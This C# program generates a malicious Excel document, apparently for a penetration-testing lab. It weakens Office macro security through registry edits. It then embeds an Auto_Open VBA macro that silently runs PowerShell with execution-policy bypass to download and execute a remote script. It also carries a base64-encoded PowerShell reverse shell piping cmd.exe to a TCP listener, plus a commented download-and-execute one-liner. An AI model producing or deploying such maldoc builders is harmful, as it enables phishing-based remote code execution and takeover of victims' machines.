using Excel = Microsoft.Office.Interop.Excel;
using System.Reflection;
using VbIntrOP = Microsoft.Vbe.Interop;
using System.Runtime.InteropServices;
using System;
using System.Text;
using Microsoft.Win32;
using System.IO;
/// <summary>
/// Programmer : Diljith Suresh
/// </summary>
namespace ExcelMacro
{
    class Program
    {
        static void Main(string[] args)
        {

            byte[] vbab64 = Convert.FromBase64String("ZnVuY3Rpb24gbWVzc3VwIHsNCmlmICgkY2xpZW50LkNvbm5lY3RlZCAtZXEgJHRydWUpIHskY2xpZW50LkNsb3NlKCl9DQppZiAoJHByb2Nlc3MuRXhpdENvZGUgLW5lICRudWxsKSB7JHByb2Nlc3MuQ2xvc2UoKX0NCmV4aXR9DQokYWRkcmVzcyA9ICcxOTIuMTY4LjEuNjgnDQokcG9ydCA9ICc0NDMnDQokY2xpZW50ID0gTmV3LU9iamVjdCBzeXN0ZW0ubmV0LnNvY2tldHMudGNwY2xpZW50DQokY2xpZW50LmNvbm5lY3QoJGFkZHJlc3MsJHBvcnQpDQokc3RyZWFtID0gJGNsaWVudC5HZXRTdHJlYW0oKQ0KJG5ldHdvcmtidWZmZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gJGNsaWVudC5SZWNlaXZlQnVmZmVyU2l6ZQ0KJHByb2Nlc3MgPSBOZXctT2JqZWN0IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzDQokcHJvY2Vzcy5TdGFydEluZm8uRmlsZU5hbWUgPSAnQzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhlJw0KJHByb2Nlc3MuU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRJbnB1dCA9IDENCiRwcm9jZXNzLlN0YXJ0SW5mby5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0ID0gMQ0KJHByb2Nlc3MuU3RhcnRJbmZvLlVzZVNoZWxsRXhlY3V0ZSA9IDANCiRwcm9jZXNzLlN0YXJ0KCkNCiRpbnB1dHN0cmVhbSA9ICRwcm9jZXNzLlN0YW5kYXJkSW5wdXQNCiRvdXRwdXRzdHJlYW0gPSAkcHJvY2Vzcy5TdGFuZGFyZE91dHB1dA0KU3RhcnQtU2xlZXAgMQ0KJGVuY29kaW5nID0gbmV3LW9iamVjdCBTeXN0ZW0uVGV4dC5Bc2NpaUVuY29kaW5nDQp3aGlsZSgkb3V0cHV0c3RyZWFtLlBlZWsoKSAtbmUgLTEpeyRvdXQgKz0gJGVuY29kaW5nLkdldFN0cmluZygkb3V0cHV0c3RyZWFtLlJlYWQoKSl9DQokc3RyZWFtLldyaXRlKCRlbmNvZGluZy5HZXRCeXRlcygkb3V0KSwwLCRvdXQuTGVuZ3RoKQ0KJG91dCA9ICRudWxsOyAkZG9uZSA9ICRmYWxzZTsgDQp3aGlsZSAoLW5vdCAkZG9uZSkgew0KaWYgKCRjbGllbnQuQ29ubmVjdGVkIC1uZSAkdHJ1ZSkge21lc3N1cH0NCiRwb3MgPSAwOyAkaSA9IDENCndoaWxlICgoJGkgLWd0IDApIC1hbmQgKCRwb3MgLWx0ICRuZXR3b3JrYnVmZmVyLkxlbmd0aCkpIHsNCiRyZWFkID0gJHN0cmVhbS5SZWFkKCRuZXR3b3JrYnVmZmVyLCRwb3MsJG5ldHdvcmtidWZmZXIuTGVuZ3RoIC0gJHBvcykNCiRwb3MrPSRyZWFkOyBpZiAoJHBvcyAtYW5kICgkbmV0d29ya2J1ZmZlclswLi4kKCRwb3MtMSldIC1jb250YWlucyAxMCkpIHticmVha319DQppZiAoJHBvcyAtZ3QgMCkgew0KJHN0cmluZyA9ICRlbmNvZGluZy5HZXRTdHJpbmcoJG5ldHdvcmtidWZmZXIsMCwkcG9zKQ0KJGlucHV0c3RyZWFtLndyaXRlKCRzdHJpbmcpDQpzdGFydC1zbGVlcCAxDQppZiAoJHByb2Nlc3MuRXhpdENvZGUgLW5lICRudWxsKSB7bWVzc3VwfQ0KZWxzZSB7DQokb3V0ID0gJGVuY29kaW5nLkdldFN0cmluZygkb3V0cHV0c3RyZWFtLlJlYWQoKSkNCndoaWxlKCRvdXRwdXRzdHJlYW0uUGVlaygpIC1uZSAtMSl7DQokb3V0ICs9ICRlbmNvZGluZy5HZXRTdHJpbmcoJG91dHB1dHN0cmVhbS5SZWFkKCkpOyBpZiAoJG91dCAtZXEgJHN0cmluZykgeyRvdXQgPSAnJ319DQokc3RyZWFtLldyaXRlKCRlbmNvZGluZy5HZXRCeXRlcygkb3V0KSwwLCRvdXQubGVuZ3RoKQ0KJG91dCA9ICRudWxsDQokc3RyaW5nID0gJG51bGx9fSBlbHNlIHttZXNzdXB9fQ==");
            string decodedString = Encoding.UTF8.GetString(vbab64);

            Excel.Application xlApp = new Excel.Application();
            Excel.Workbook xlWorkBook;
            Excel.Worksheet xlWorkSheet;
            xlApp.DisplayAlerts = false;
            xlApp.AutomationSecurity = Microsoft.Office.Core.MsoAutomationSecurity.msoAutomationSecurityForceDisable;
            xlWorkBook = xlApp.Workbooks.Add(true);
            xlWorkSheet = (Excel.Worksheet)xlWorkBook.ActiveSheet;

            if(xlWorkSheet == null)
            {
                Console.WriteLine("Sheet Null");
            }
          


            string regpath = @"Software\Microsoft\Office\" + xlApp.Version + @"\Excel\Security";

            RegistryKey key = Registry.CurrentUser.OpenSubKey(regpath, true);
            if (key != null)
            {
                key.SetValue("AccessVBOM", "1", RegistryValueKind.DWord);
                key.SetValue("VBAWarnings", "1", RegistryValueKind.DWord);
                key.Close();
            }

            VbIntrOP.VBComponent xlMod;
            xlMod = xlWorkBook.VBProject.VBComponents.Add(VbIntrOP.vbext_ComponentType.vbext_ct_StdModule);
            xlMod.Name = "OurMacro";

            /*place the VB macro code within a string first.
            Make sure that you maintain spacing levels for code that goes inside Subs.
            End each line with \r\n to tell VBA to start a new line.  Call Shell("cmd.exe / c powershell.exe IEX(IWR -uri 'http://RHOST/getit.ps1')", 1)
            */
            string macroCode = @"Sub Auto_Open()
 Dim strpscmd As String
 strpscmd = ""powershell - exec bypass - nop - c iex((new- object
   system.net.webclient).downloadstring(''http://192.168.119.120/getit.txt''))""
 Shell strpscmd, vbHide
End Sub";

            xlMod.CodeModule.AddFromString(macroCode);
            string outpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"new4.xls");

            try
            {//save the workbook.
                xlWorkBook.SaveAs(outpath, Excel.XlFileFormat.xlExcel8, Missing.Value, Missing.Value, Missing.Value, Missing.Value, Excel.XlSaveAsAccessMode.xlNoChange, Missing.Value, Missing.Value, Missing.Value, Missing.Value, Missing.Value);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                //release all memory - stop EXCEL.exe from hanging around.
                if (xlMod != null) { Marshal.ReleaseComObject(xlMod); }
                if (xlWorkBook != null) { Marshal.ReleaseComObject(xlWorkBook); }
                if (xlWorkSheet != null) { Marshal.ReleaseComObject(xlWorkSheet); }
                if (xlApp != null) { Marshal.ReleaseComObject(xlApp); }
                xlMod = null;
                xlWorkBook = null;
                xlWorkSheet = null;
                xlApp = null;
                GC.Collect();

                Environment.Exit(0);
            }
            finally
            {
                RegistryKey key2 = Registry.CurrentUser.OpenSubKey(regpath, true);
                if (key2 != null)
                {
                    key2.SetValue("AccessVBOM", "0", RegistryValueKind.DWord);
                    key2.SetValue("VBAWarnings", "0", RegistryValueKind.DWord);
                    key2.Close();
                }
                //release all memory - stop EXCEL.exe from hanging around.
                if (xlMod != null) { Marshal.ReleaseComObject(xlMod); }
                if (xlWorkBook != null) { Marshal.ReleaseComObject(xlWorkBook); }
                if (xlWorkSheet != null) { Marshal.ReleaseComObject(xlWorkSheet); }
                if (xlApp != null) { Marshal.ReleaseComObject(xlApp); }
                xlMod = null;
                xlWorkBook = null;
                xlWorkSheet = null;
               xlApp = null;
                GC.Collect();

               

               
            }
            

           
        }
    }
}
